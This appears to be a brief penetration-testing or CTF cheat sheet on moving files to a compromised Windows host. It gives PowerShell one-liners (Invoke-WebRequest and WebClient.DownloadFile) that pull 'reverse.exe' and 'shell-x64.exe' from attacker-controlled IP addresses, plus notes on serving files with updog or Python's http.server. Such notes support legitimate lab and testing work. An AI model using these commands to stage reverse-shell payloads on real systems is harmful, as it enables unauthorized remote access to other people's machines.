DLed files
powershell -c 'Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe'
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.192.69:8001/shell-x64.exe','shell-x64.exe')"
curl 
wget

Xfer files
#Updog - [GitHub - sc0tfree/updog: Updog is a replacement for Python's SimpleHTTPServer. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use http basic auth.](https://github.com/sc0tfree/updog)
python3 -m http.server